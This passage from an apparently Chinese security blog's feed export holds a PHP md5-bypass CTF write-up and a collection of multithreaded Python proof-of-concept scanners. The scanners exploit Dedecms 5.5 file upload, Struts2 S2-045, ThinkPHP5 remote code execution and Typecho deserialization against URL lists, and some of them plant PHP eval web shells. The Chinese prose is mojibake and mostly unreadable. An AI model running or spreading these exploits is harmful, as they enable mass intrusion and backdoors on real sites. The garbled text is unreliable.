@$_GET[&apos;str1&apos;]; $str2 = @$_GET[&apos;str2&apos;]; $str3 = @$_GET[&apos;str3&apos;]; $str4 = @$_GET[&apos;str4&apos;]; $str5 = (string)@$_POST[&apos;str5&apos;]; $str6 = (string)@$_POST[&apos;str6&apos;]; $str7 = (string)@$_POST[&apos;str7&apos;]; if( $str1 == $str2 ){ die(&apos;str1 OR Sstr2 no no no&apos;); } if( md5($str1) != md5($str2) ){ die(&apos;step 1 fail&apos;); } if( $str3 == $str4 ){ die(&apos;str3 OR str4 no no no&apos;); } if ( md5($str3) !== md5($str4)){ die(&apos;step 2 fail&apos;); } if( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 ){ die(&apos;str5 OR str6 OR str7 no no no&apos;); } if (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7)){ die(&apos;step 3 fail&apos;); } if(!($_POST[&apos;a&apos;]) and !($_POST[&apos;b&apos;])) { echo &quot;come on!&quot;; die(); } $a = $_POST[&apos;a&apos;]; $b = $_POST[&apos;b&apos;]; $m = $_GET[&apos;m&apos;]; $n = $_GET[&apos;n&apos;]; if (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; 6)) { echo &quot;a OR b fail!&quot;; die(); } if ((strlen($m) &gt; 4) || (strlen($n) &gt; 4)) { echo &quot;m OR n fail&quot;; die(); } $str8 = hash(&apos;md5&apos;, $a, false); $str9 = strtr(hash(&apos;md5&apos;, $b, false), $m, $n); echo &quot;&lt;p&gt;str8 : $str8&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;str9 : $str9&lt;/p&gt;&quot;; if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6)) { echo &quot;You&apos;re great,give you flag:&quot;; echo $flag; }ËøòÁÆóÊØîËæÉÂ∏∏ËßÑÊØîËæÉÁÆÄÂçïÁöÑÊ∫êÁ†ÅÔºå‰∏ªË¶ÅÊòØËÄÉÂá†‰∏™phpÁü•ËØÜÁÇπ„ÄÇ 1.È¶ñÂÖàÈúÄË¶Å‰º†ÂèÇÊï∞str1‰∏çËÉΩÁ≠â‰∫éstr2Ôºå‰ΩÜÊòØÈúÄË¶Åmd5‰∏ÄÊ†∑Ôºå‰∏çÊ∏ÖÊ•öÁöÑÁôæÂ∫¶php md5Âº±ÊØîËæÉ„ÄÇ‰πüÂ∞±ÊòØÂ≠óÁ¨¶‰∏≤QNKCDZO ÂíåÂ≠óÁ¨¶‰∏≤s878926199aÔºåËøô‰∏§‰∏™Âä†ÂØÜÂá∫Êù•ÁöÑmd5ÊòØ MD5(&quot;QNKCDZO&quot;)=0e830400451993494058024219903391 MD5(&quot;s878926199a&quot;)=0e545993274517709034328855841020Âú®php‰∏≠Â¶ÇÊûúÊòØ0eÂºÄÂ§¥ÁöÑÂ≠óÁ¨¶‰∏≤ËøõË°å==ÊØîËæÉÔºå‰ºöËÆ§‰∏∫ÊòØÁßëÂ≠¶ËÆ∞Êï∞Ê≥ï0eÔºå0ÁöÑÂá†Ê¨°ÊñπÔºåÊâÄ‰ª•ÁªìÊûúËá™ÁÑ∂ÊòØ0ÔºåËøôÊ†∑Â∞±ËææÂà∞‰∫ÜÂ≠óÁ¨¶‰∏≤ÊØîËæÉ‰∏çÁõ∏Á≠âÔºå‰ΩÜÊòØMD5ÂÄºÁõ∏Á≠âÁöÑÁªïËøáÊñπÊ≥ïÔºåÂâçÊèêÊòØ0eÂêéÈù¢Ë∑üÁöÑÊòØÊï∞Â≠óÔºåÂ¶ÇÊûúÊòØ0e1a223‚Ä¶Ôºå0eÂêéÈù¢Êúâ‰∏™aÂ≠óÊØçÂàôÊó†Ê≥ïËΩ¨ÂåñÊàê0„ÄÇ 2.str3Âíåstr4Âíåstr1 str2Â∑Æ‰∏çÂ§öÔºåÂîØ‰∏ÄÂèòÂåñÊòØËøôÊ¨°Áî®Âà∞‰∫Ü!==ÈúÄË¶ÅÁªïËøáÔºå‰ΩÜÊòØÂú®ËøôÁßç‰∏•ÂØÜÁöÑ!==Ôºå0eËøôÁßç‰∏çÂèØ‰ª•ÁªïËøá‰∫ÜÔºå‰ªñ‰ºö‰∏Ä‰∏™‰∏Ä‰∏™Â≠óÁ¨¶ÁöÑÂØπÊØîÔºåËÄå‰∏çÊòØËß£Êûê‰∏∫0ÔºåËøô‰∏™Êó∂ÂÄôÈúÄË¶ÅÁî®Âà∞Êï∞ÁªÑÁ±ªÂûã‰∏çÂêåÊù•ÁªïËøáÔºå‰πüÂ∞±ÊòØstr3[]=1,str4=0ÔºåÂõ†‰∏∫Ëøô‰∏§ÁßçÊ†πÊú¨‰∏çÊòØÂêå‰∏ÄÁßçÁ±ªÂûãÁöÑÔºåÊâÄ‰ª•Ëá™ÁÑ∂Êó†Ê≥ïÊØîËæÉËøîÂõûfalseÔºåËøõËÄåÁªïËøá„ÄÇ 3.str5 str6 str7ÔºåÈ¶ñÂÖàÁ¨¨‰∏Ä‰∏™ËÇØÂÆö‰∏çËÉΩ‰∏â‰∏™Áõ∏Á≠âÔºå‰ΩÜÊòØ‰∏ãÈù¢ÂèàÁî®‰∏•Ê†ºÁöÑÂà§Êñ≠ÂøÖÈ°ªmd5Áõ∏Á≠âÔºåÂú®php‰∏≠===Âíå!==ËøôÁßçÂá†‰πéÊòØÊ≤°ÂäûÊ≥ïÁªïËøáÁöÑÔºåÊâÄ‰ª•Âè™ËÉΩËÆ©‰ªñ‰ª¨ÁöÑmd5ÁúüÊ≠£Áõ∏Á≠âÔºåÂ¶ÇÊûú‰∏ÄÂºÄÂßãÂ∞±ÂéªÁªïÂèØËÉΩÂ∞±Èô∑ËøõÂéª‰∫ÜÔºåËøô‰∏™Âà§Êñ≠ÁöÑÈöæÁÇπÂú®‰∫éÊâæÂà∞‰∏â‰∏™ÁúüÊ≠£Áõ∏Á≠âÁöÑMD5ÂÄºÁöÑÂéüÂûã„ÄÇËøôÈáåÂèÇËÄÉ‰∏ÄÁØáÊñáÁ´†„ÄÇ https://xz.aliyun.com/t/3161#toc-5Âü∫‰∫éÂÖ®Á≠âÁöÑMD5Á¢∞ÊíûÁªïËøáËøô‰∏ÄÁõÆÂΩï‰∏ãÁöÑËÆ≤Ëß£ÔºåÂæàËØ¶ÁªÜÔºåÈúÄË¶Å‰∏ãËΩΩ‰ªñÊâÄËØ¥ÁöÑ‰∏§‰∏™Â∑•ÂÖ∑ÔºåÁÑ∂ÂêéÊåâÁÖß‰ªñÁöÑÂëΩ‰ª§ D:\fastcoll&gt;fastcoll_v1.0.0.5.exe -o jlzj0 jlzj1 #-oÂèÇÊï∞‰ª£Ë°®ÈöèÊú∫ÁîüÊàê‰∏§‰∏™Áõ∏ÂêåMD5ÁöÑÊñá‰ª∂ D:\fastcoll&gt;fastcoll_v1.0.0.5.exe -p jlzj1 -o jlzj00 jlzj01 #-pÂèÇÊï∞‰ª£Ë°®Ê†πÊçÆjlzj1Êñá‰ª∂ÈöèÊú∫ÁîüÊàê‰∏§‰∏™Áõ∏ÂêåMD5ÁöÑÊñá‰ª∂ÔºåÊ≥®ÊÑèÔºöÁîüÊàêÁöÑMD5‰∏éjlzj1‰∏çÂêå D:\fastcoll&gt;tail.exe -c 128 jlzj00 &gt; a #-c 128‰ª£Ë°®Â∞Üjlzj00ÁöÑÊúÄÂêé128‰ΩçÂÜôÂÖ•Êñá‰ª∂aÔºåËøô128‰ΩçÊ≠£ÊòØjlzj1‰∏éjlzj00ÁöÑMD5‰∏çÂêåÁöÑÂéüÂõ† D:\fastcoll&gt;tail.exe -c 128 jlzj01 &gt; b #ÂêåÁêÜ D:\fastcoll&gt;type jlzj0 a &gt; jlzj10 #ËøôÈáåË°®Á§∫Â∞Üjlzj0ÂíåaÊñá‰ª∂ÁöÑÂÜÖÂÆπÂêàÂπ∂ÂÜôÂÖ•jlzj10 D:\fastcoll&gt;type jlzj0 b &gt; jlzj11 #ÂêåÁêÜÂÜôÂÖ•jlzj11ÁîüÊàêÊñá‰ª∂Âç≥ÂèØÔºåÁîüÊàêÁöÑÊñá‰ª∂ÂÜÖÂÆπËøõË°åMD5Âä†ÂØÜÂ∞±ÊòØÁõ∏ÂêåÁöÑÔºå‰ΩÜÊòØÈúÄË¶ÅurlÁºñÁ†ÅÊèê‰∫§Âà∞burpÈáåÈù¢ÂèëÂåÖ,Â¶ÇÊûúÂú®ÊµèËßàÂô®Èáå‰ºöËá™Âä®Ëß£Á†ÅÔºåÂá∫Áé∞Â§ßÂ§ßÂ∞èÂ∞èÁöÑÂêÑÁßçÈóÆÈ¢ò„ÄÇ ÁºñÁ†ÅÂèÇËÄÉÔºöhttps://xz.aliyun.com/t/2232ÊúÄÁªàÂ∞ÜÁîüÊàêÁöÑ‰∏â‰∏™urlÁºñÁ†Å‰πãÂêéÁöÑÂàÜÂà´Â§çÂà∂Áªôstr5 str6 str7„ÄÇ 4.Á¨¨Âõõ‰∏™ÁÇπÔºåÈ¶ñÂÖàpost aÂíåbÔºåÁÑ∂ÂêéËøõÂÖ•Á¨¨‰∫å‰∏™Âà§Êñ≠ÔºåaÂøÖÈ°ªÊòØÂ§ßÂÜôÂ≠óÊØçÔºåbÂøÖÈ°ªÊòØÊï∞Â≠óÔºå(is_numericÂáΩÊï∞‰πüÊúâ‰∏Ä‰∫õÊºèÊ¥û)ÔºåbÁöÑÈïøÂ∫¶‰∏çËÉΩÂ§ß‰∫é6ÔºåËøôÈáåÊàë‰ª¨ÊääËßÜËßíÁßªÂà∞ÊúÄÂêé‰∏Ä‰∏™ifÂà§Êñ≠ if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6)) ËøôÈáåÁî®===Âà§Êñ≠ÔºåbÁöÑÈïøÂ∫¶ÂøÖÈ°ª‰∏∫6ÔºåÂàöÂàöÊàë‰ª¨ËØ¥‰∫Ü===ÂæàÈöæÁªïËøáÔºåÊâÄ‰ª•bÁöÑÈïøÂ∫¶Â∞±Âè™ËÉΩ‰∏∫6ÔºåÂÖ∂‰∏≠a‰∏çËÉΩÁ≠â‰∫ébÔºåËøô‰∏™ÂæàÂÆπÊòìÂÅöÂà∞Ôºåstr8 == str9Ôºå $str8 = hash(&apos;md5&apos;, $a, false); $str9 = strtr(hash(&apos;md5&apos;, $b, false), $m, $n); ÂæàÊòæÁÑ∂ÂèàÊòØÈúÄË¶Å0eÊù•ÁªïËøá‰ΩøÂæómd5ÂêéÁöÑa bÁõ∏Á≠âÔºåËøôÈáåaÁöÑÂÄºÂæàÁÆÄÂçïÔºåÂà©Áî®ÁΩë‰∏äÁé∞ÊúâÁöÑMD5‰πãÂêéÁöÑÂéüÂûãQNKCDZOÔºåÂπ∂‰∏îÈÉΩÊòØÂ§ßÂÜôÔºå‰ΩÜÊòØbÊÉ≥Ë¶ÅÊâæÂà∞ÂÖ≠‰ΩçÁöÑÂπ∂‰∏î0eÂºÄÂ§¥ËÉΩÂ§üÂà©Áî®ÁöÑ‰ªø‰ΩõÂπ∂Êâæ‰∏çÂà∞ÔºåËøôÈáåÊÉ≥‰∫ÜÂæà‰πÖÔºå‰∏çËøáËøòÂ•ΩÊúâ‰∏Ä‰∏™Â≠óÁ¨¶ÊõøÊç¢Ôºå strtr(hash(&apos;md5&apos;, $b, false), $m, $n)ËøôÈáåÊòØÂ∞ÜmÊõøÊç¢‰∏∫nÔºåËøôÊ†∑Êàë‰ª¨Â∞±ÂèØ‰ª•Âà©Áî®ÊõøÊç¢ÔºåÂ∞Ü‰∏Ä‰∫õÂèØËÉΩÊûÑÈÄ†ÁöÑmd5ÂÄºÊûÑÈÄ†ÊàêÊàë‰ª¨ÈúÄË¶ÅÁöÑÔºåÊØîÂ¶Ç 0e123123aaaÔºåÊàë‰ª¨ÂèØ‰ª•ËÆ©m=aÔºån=1ÔºåÊõøÊç¢‰∏∫0e123123111ÔºåËøôÊ†∑Â∞±ÂèØ‰ª•ËøõË°åÂà§Êñ≠ÁªïËøá‰∫ÜÔºåËøôÈáåËøòË¶ÅÊèêÂà∞‰∏äÈù¢ÊèêÁ§∫‰∫Ü‰∏Ä‰∏™ÁÇπÁî®is_numericÂáΩÊï∞ÁöÑÊºèÊ¥ûÔºå‰ªñÂèØ‰ª•Êé•ÂèóÂçÅÂÖ≠ËøõÂà∂Ôºå0xFFFF‰ªñÂêåÊ†∑ËÆ§‰∏∫ÊòØÊï∞Â≠óÔºåÊâÄ‰ª•Êàë‰ª¨ÂÜô‰∏™ËÑöÊú¨ÊâæÂà∞0eÂºÄÂ§¥ÁöÑmd5ÂÄºÔºåÁÑ∂ÂêéÊõøÊç¢ÊéâÂÖ∂‰∏≠ÁöÑÂ≠óÊØçÔºåÊúÄÁªàÁªïËøá„ÄÇ for($i=1000;$i&lt;9999;$i++) { $b=&quot;0x&quot;.$i; #echo md5($b); $c=md5($b); if(preg_match(&apos;/^0e/&apos;,$c)) { echo $b.&quot;=====&gt;&gt;&quot;; echo $c; echo &quot;&lt;br/&gt;&quot;; } } ÈÄâÊã©ÂÖ∂‰∏≠‰∏Ä‰∏™ 0x6156=====&gt;&gt;0ec4899c94ada8d08a6ada8623c6ff01 ÂàöÂ•Ωmd5ÂÄºÊúâÊï∞Â≠ó cadfÔºåÂõõ‰∏™Â≠óÁ¨¶ÂàöÂ•ΩÁî®ÈïøÂ∫¶ÊúÄÂ§ß‰∏∫4ÁöÑm nÊù•ÊõøÊç¢ÔºåÂÆåÊï¥ÁöÑpocÔºåÂæóÂà∞flag„ÄÇ]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pocËÑöÊú¨Êï¥ÁêÜ]]></title>
    <url>%2F2019%2F03%2F23%2F%E4%B8%80%E4%BA%9B%E8%84%9A%E6%9C%ACpoc%2F</url>
    <content type="text"><![CDATA[ÁªáÊ¢¶dedeÊºèÊ¥ûÁâàÊú¨ÔºöDedecms 5.5 ÁªáÊ¢¶(Dedecms)select_soft_post.phpÈ°µÈù¢ÂèòÈáèÊú™ÂàùÂßãÊºèÊ¥û # -*- coding:UTF-8 -*- import requests import threading import time import sys class check(threading.Thread): #Âà§Êñ≠ÊòØÂê¶Â≠òÂú®Ëøô‰∏™ÊºèÊ¥ûÁöÑÊâßË°åÂáΩÊï∞ def __init__(self, url, sem): super(check, self).__init__() #ÁªßÊâøthreadingÁ±ªÁöÑÊûÑÈÄ†ÊñπÊ≥ïÔºåpython3ÁöÑÂÜôÊ≥ïsuper().__init__() self.url = url self.sem = sem def run(self): requests.packages.urllib3.disable_warnings() payload = &quot;include/dialog/select_soft_post.php&quot; multipart_form_data = { &apos;activepath&apos;:(None,&apos;/data/cache&apos;), &apos;cfg_basedir&apos;:(None,&apos;../../&apos;), &apos;cfg_imgtype&apos;:(None,&apos;php&apos;), &apos;cfg_not_allowall&apos;:(None,&apos;txt&apos;), &apos;cfg_softtype&apos;:(None,&apos;php&apos;), &apos;cfg_mediatype&apos;:(None,&apos;php&apos;), &apos;f&apos;:(None,&apos;form1.enclosure&apos;), &apos;job&apos;:(None,&apos;upload&apos;), &apos;newname&apos;:(None,&apos;hag.php&apos;), &apos;uploadfile&apos;:(&apos;hag.php&apos;,&apos;&lt;?php eval($_POST[q]);?&gt;&apos;,&apos;application/octet-stream&apos;), } try: r = requests.post(self.url.strip()+payload,files=multipart_form_data,timeout=6,verify=False) except IOError: print &quot;time out 1&quot; newurl=self.url.strip()+&quot;data/cache/hag.php&quot; payloads={&apos;q&apos;:&apos;echo &quot;sectest&quot;;&apos;} try: rr=requests.post(newurl,allow_redirects=False,timeout=3,data=payloads)#ÊµãËØïÊòØÂê¶Êñá‰ª∂ÂàõÂª∫ÊàêÂäü body=rr.text if body.find(&apos;sectest&apos;)!=-1: with open(&apos;./success.txt&apos;,&apos;a&apos;) as f1: f1.write(newurl+&quot;\n&quot;) print(&quot;web is success-----&gt;&gt;&gt;&gt;&gt;&gt;&quot;+self.url) else: print(&quot;web is fail--------&gt;&gt;&gt;&gt;&gt;&gt;&quot;+self.url) except IOError: print &quot;time out 2&quot; self.sem.release() if __name__ == &apos;__main__&apos;: f = open(&quot;./1.txt&quot;) sem = threading.Semaphore(10) #ÊúÄÂ§ßÁ∫øÁ®ãÊï∞‰∏∫10‰∏™ for url in f.readlines(): sem.acquire() #ÈÅçÂéÜ‰∏Ä‰∏™Â∞±Ëé∑Âæó‰∏Ä‰∏™Á∫øÁ®ãÔºåÁõ¥Âà∞ËææÂà∞ÊúÄÂ§ß host_thread = check(url,sem) host_thread.start()#ÊâßË°åcheck()ÁöÑÊâßË°åÂáΩÊï∞‰ΩøÁî®ÊñπÊ≥ïÔºöÂú®ÂΩìÂâçÈ°µÈù¢‰∏ãÂàõÂª∫./1.txtÔºà‰∏∫ÈúÄË¶ÅÊ£ÄÊµãÁöÑurlÔºâÔºåsuccess.txt‰∏∫Âê´ÊúâÊºèÊ¥ûÁöÑurl„ÄÇ s2-045javaÁöÑÊºèÊ¥ûÔºås2-045ÁΩë‰∏äÂèØÊâæÂà∞ËØ¶ÊÉÖ„ÄÇ # -*- coding:UTF-8 -*- import urllib2 import threading import requests requests.packages.urllib3.disable_warnings() header = { &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;, &apos;Accept-Encoding&apos;: &apos;gzip, deflate, compress&apos;, &apos;Cache-Control&apos;: &apos;max-age=0&apos;, &apos;Connection&apos;: &apos;close&apos;, &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&apos;, &apos;Content-Type&apos;:&quot;%{(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println(88888888-23333+1222)).(#o.close())}&quot; } class check(threading.Thread): #Âà§Êñ≠ÊòØÂê¶Â≠òÂú®Ëøô‰∏™ÊºèÊ¥ûÁöÑÊâßË°åÂáΩÊï∞ def __init__(self, url, sem): super(check, self).__init__() #ÁªßÊâøthreadingÁ±ªÁöÑÊûÑÈÄ†ÊñπÊ≥ïÔºåpython3ÁöÑÂÜôÊ≥ïsuper().__init__() self.url = url self.sem = sem def run(self): try: response = requests.post(self.url,data=&apos;&apos;,headers=header,verify=False,allow_redirects = False,timeout=6) if response.content.find(&quot;88866777&quot;)!=-1: print &apos;success------&gt;&gt;&gt;&gt;&gt;&gt;&apos;+self.url with open(&apos;./success.txt&apos;,&apos;a&apos;) as f1: f1.write(newurl+&quot;\n&quot;) else: print &apos;fail---------&gt;&gt;&gt;&gt;&gt;&gt;&apos;+self.url except Exception as e: print &apos;timeout------&gt;&gt;&gt;&gt;&gt;&gt;&apos;+self.url self.sem.release() if __name__ == &quot;__main__&quot;: urls = open(&apos;./url.txt&apos;, &apos;r&apos;) sem = threading.Semaphore(10) #ÊúÄÂ§ßÁ∫øÁ®ãÊï∞‰∏∫10‰∏™ for url in urls.readlines(): url = url.strip(&apos;\n&apos;) url = url.split(&apos;%3F&apos;, 1)[0] sem.acquire() #ÈÅçÂéÜ‰∏Ä‰∏™Â∞±Ëé∑Âæó‰∏Ä‰∏™Á∫øÁ®ãÔºåÁõ¥Âà∞ËææÂà∞ÊúÄÂ§ß host_thread = check(url,sem) host_thread.start()#ÊâßË°åcheck()ÁöÑÊâßË°åÂáΩÊï∞‰ΩøÁî®ÊñπÊ≥ïÔºöÂú®ÂΩìÂâçÈ°µÈù¢‰∏ãÂàõÂª∫./url.txtÔºà‰∏∫ÈúÄË¶ÅÊ£ÄÊµãÁöÑurlÔºâÔºåsuccess.txt‰∏∫Âê´ÊúâÊºèÊ¥ûÁöÑurl„ÄÇ thinkphp5thinkphp5ÂëΩ‰ª§ÊâßË°å # -*- coding:UTF-8 -*- import requests import threading import time import sys class check(threading.Thread): #Âà§Êñ≠ÊòØÂê¶Â≠òÂú®Ëøô‰∏™ÊºèÊ¥ûÁöÑÊâßË°åÂáΩÊï∞ def __init__(self, url, sem): super(check, self).__init__() #ÁªßÊâøthreadingÁ±ªÁöÑÊûÑÈÄ†ÊñπÊ≥ïÔºåpython3ÁöÑÂÜôÊ≥ïsuper().__init__() self.url = url self.sem = sem def run(self): parameters = &quot;s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1&quot; try: responce = requests.get(url = self.url, params = parameters,timeout=3) body = responce.text if body.find(&apos;PHP Extension&apos;) != -1: with open(&quot;success.txt&quot;, &quot;a+&quot;) as f1: f1.write(&quot;Â≠òÂú®tp5ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û: &quot; + self.url + &quot;\n&quot;) print(&quot;[+] &quot; + self.url) else: print(&quot;[-] &quot; + self.url) except Exception,err: print(&quot;connect failed&quot;) pass self.sem.release() #ÊâßË°åÂÆåÂáΩÊï∞ÔºåÈáäÊîæÁ∫øÁ®ãÔºåÁ∫øÁ®ãÊï∞Âä†1 class host(threading.Thread): #ÈÅçÂéÜÊñá‰ª∂Êìç‰Ωú def __init__(self, sem): super(host, self).__init__() #ÁªßÊâøthreadingÁ±ªÁöÑÊûÑÈÄ†ÊñπÊ≥ïÔºåpython3ÁöÑÂÜôÊ≥ïsuper().__init__() self.sem = sem def run(self): with open(&quot;url.txt&quot;, &quot;r&quot;) as f: for host in f.readlines(): self.sem.acquire() #ÈÅçÂéÜ‰∏Ä‰∏™Â∞±Ëé∑Âæó‰∏Ä‰∏™Á∫øÁ®ãÔºåÁõ¥Âà∞ËææÂà∞ÊúÄÂ§ß host = host.strip()+&quot;/public/index.php&quot; host_thread = check(host, self.sem) host_thread.start() #ÊâßË°åcheck()ÁöÑÊâßË°åÂáΩÊï∞ if __name__ == &apos;__main__&apos;: sem = threading.Semaphore(10) #ÊúÄÂ§ßÁ∫øÁ®ãÊï∞‰∏∫10‰∏™ thread = host(sem) #‰º†ÈÄísemÂÄº thread.start()‰ΩøÁî®ÊñπÊ≥ïÔºöÂú®ÂΩìÂâçÈ°µÈù¢‰∏ãÂàõÂª∫./url.txtÔºà‰∏∫ÈúÄË¶ÅÊ£ÄÊµãÁöÑurlÔºâÔºåsuccess.txt‰∏∫Âê´ÊúâÊºèÊ¥ûÁöÑurl„ÄÇ typechotypechoÂèçÂ∫èÂàóÂåñÊºèÊ¥û #/usr/bin/env python # -*- coding: UTF-8 -*- import getopt,sys import requests import sys import string import time import threading class check(threading.Thread): def __init__(self, url, sem): super(check, self).__init__() #ÁªßÊâøthreadingÁ±ªÁöÑÊûÑÈÄ†ÊñπÊ≥ïÔºåpython3ÁöÑÂÜôÊ≥ïsuper().__init__() self.url = url self.sem = sem def run(self): headers = { &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0&apos;, &apos;Referer&apos;: self.url, &apos;cookie&apos;: &quot;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==&quot; } try: reqs=s.get(self.url,timeout=3,headers=headers,allow_redirects=False) #print(reqs.status_code), except IOError: #Â¶ÇÊûúÁΩëÁ´ôÊâì‰∏çÂºÄÂ∞ÜËæìÂá∫fail print(&quot;time out 1&quot;) urls=self.url+&quot;/p0.php&quot; urlsss=self.url+&quot;/install.php?finish=1&quot; payloads={&apos;p0&apos;:&apos;echo &quot;sectest&quot;;&apos;} try: reqss=s.post(urls,allow_redirects=False,timeout=3,data=payloads)#ÊµãËØïÊòØÂê¶Êñá‰ª∂ÂàõÂª∫ÊàêÂäü body=reqss.text if body.find(&apos;sectest&apos;)!=-1: print(&quot;web is success-----&gt;&gt;&gt;&gt;&gt;&gt;&quot;+self.url) with open(&quot;./success.txt&quot;, &quot;a+&quot;) as f1: f1.write(self.url + &quot;\n&quot;) else: print(&quot;web is fail--------&gt;&gt;&gt;&gt;&gt;&gt;&quot;+self.url) print(&apos;\n&apos;) except IOError: #Â¶ÇÊûúÁΩëÁ´ôÊâì‰∏çÂºÄÂ∞ÜËæìÂá∫fail print(&quot;time out 2&quot;) self.sem.release() if __name__ == &apos;__main__&apos;: reload(sys)#Âêå‰∏ãËß£ÂÜ≥‰∏≠Êñá‰π±Á†Å sys.setdefaultencoding(&apos;utf-8&apos;)#Ëß£ÂÜ≥‰∏≠Êñá‰π±Á†Å f = open(&quot;./1.txt&quot;)#ÊâìÂºÄÊâπÈáèÊâ´ÊèèÁöÑÁΩëÁ´ôÊñá‰ª∂ s=requests.Session() sem = threading.Semaphore(10) #ÊúÄÂ§ßÁ∫øÁ®ãÊï∞‰∏∫10‰∏™ for line in f.readlines():#ËØªÂèñÊØè‰∏ÄË°åÁöÑÁΩëÁ´ô line=line.strip(&apos;\n&apos;)#Ê∂àÂéªÊç¢Ë°å url=line#ÊØèË°åÁöÑÁΩëÁ´ôËµãÂÄºÁªôurl host_thread = check(url,sem) host_thread.start()#ÊâßË°åcheck()ÁöÑÊâßË°åÂáΩÊï∞‰ΩøÁî®ÊñπÊ≥ïÔºöÂú®ÂΩìÂâçÈ°µÈù¢‰∏ãÂàõÂª∫./1.txtÔºà‰∏∫ÈúÄË¶ÅÊ£ÄÊµãÁöÑurlÔºâÔºåsuccess.txt‰∏∫Âê´ÊúâÊºèÊ¥ûÁöÑurl„ÄÇ]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpcmsÂ∏∏ËßÅÊºèÊ¥û]]></title>
    <url>%2F2019%2F03%2F18%2Fphpcms%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[PHPÊ°ÜÊû∂‰ªÄ‰πàÊòØÊ°ÜÊû∂Ê°ÜÊû∂Â∞±ÊòØÂèØÈáçÁî®‰ª£Á†ÅÁöÑÈõÜÂêàÔºåÊ°ÜÊû∂ÁöÑ‰ª£Á†ÅÊòØÊ°ÜÊû∂Êû∂ÊûÑÁöÑ‰ª£Á†ÅÔºå‰∏çÊòØ‰∏öÂä°ÈÄªËæë‰ª£Á†ÅÔºåÊ°ÜÊû∂‰ª£Á†Å‰øùÊä§Á±ª.ÊñπÊ≥ï.ÂáΩÊï∞Á≠âÁ≠âÔºåÊ°ÜÊû∂‰ª£Á†ÅÊåâÁÖß‰∏ÄÂÆöÁöÑËßÑÂàôÁªÑÂêàËµ∑Êù•Â∞±ÂΩ¢Êàê‰∫ÜÊ°ÜÊû∂„ÄÇ PHPÂ∏∏Áî®Ê°ÜÊû∂1.zendframwork: (ZF)ÊòØZendÂÖ¨Âè∏Êé®Âá∫ÁöÑ‰∏ÄÂ•óPHPÂºÄÂèëÊ°ÜÊû∂„ÄÇ2.YiiÁî±ÂõΩ‰∫∫ÂºÄÂèëÁöÑÈáçÈáèÁ∫ßÁöÑÊ°ÜÊû∂ÔºåËøô‰∏™Ê°ÜÊû∂Êää‰ª£Á†ÅÁöÑÂèØÈáçÁî®ÊÄßÂèëÊå•Âà∞ÊûÅËá¥„ÄÇ3.CakePHPÊòØÂõΩÂ§ñÁöÑÊ°ÜÊû∂.4.SymfonyÔºåÊòØ‰∏ÄÂ•óÂõΩÂ§ñÁöÑPHPÂºÄÊ∫êÊ°ÜÊû∂„ÄÇ5.CodeIgniterÔºàCIÔºâËΩªÈáèÁ∫ßÊ°ÜÊû∂ÔºåËøêË°åÈÄüÂ∫¶Âø´6.CanPHPÊ°ÜÊû∂ÊòØ‰∏Ä‰∏™ÁÆÄÊ¥ÅÔºåÂÆûÁî®ÔºåÈ´òÊïàÔºåÈÅµÂæ™apacheÂçèËÆÆÁöÑphpÂºÄÊ∫êÊ°ÜÊû∂„ÄÇ7„ÄÇLaravel ÊòØ‰∏Ä‰∏™ÁÆÄÂçï‰ºòÈõÖÁöÑ PHP web ÂºÄÂèëÊ°ÜÊû∂ÔºåÂ∞Ü‰Ω†‰ªéÊÑèÂ§ßÂà©Èù¢Êù°ÂºèÁöÑ‰ª£Á†Å‰∏≠Ëß£ÊîæÂá∫Êù•„ÄÇÈÄöËøáÁÆÄÂçïÁöÑ„ÄÅË°®ËææÂºèËØ≠Ê≥ïÂºÄÂèëÂá∫ÂæàÊ£íÁöÑ Web Â∫îÁî®„ÄÇ8.SlimFrameworkÊòØ‰∏Ä‰∏™ÁÆÄÂçïÁöÑ PHP5 Ê°ÜÊû∂Áî®Êù•ÂàõÂª∫ RESTful ÁöÑ Web 